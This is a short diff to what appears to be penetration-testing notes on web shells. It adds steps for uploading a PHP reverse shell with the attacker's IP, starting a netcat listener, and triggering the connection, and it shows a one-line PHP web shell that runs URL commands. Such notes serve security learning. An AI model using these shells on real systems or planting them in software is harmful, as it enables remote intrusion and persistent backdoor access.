@@ -56,6 +56,11 @@ In order to use this, we need to replace "<IP>" and "<port>" with an appropriate
 
 ## Web Shells
 ### Basic Web Shell
+- You can find the php file for reverse shell in `/usr/share/webshells/php/php-reverse-shell.php` -> Here, change the IP address in this file to your host(attack machine IP) and upload the file to the website
+- Turn on the listerner on your host machine(attacker machine), `nc -lvnp <port>`
+- Try to access the file in the website, if it is vulnerable to RCE then you will get the reverse shell in your host machine.
+
+In url command execution
 `<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
 This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.
 
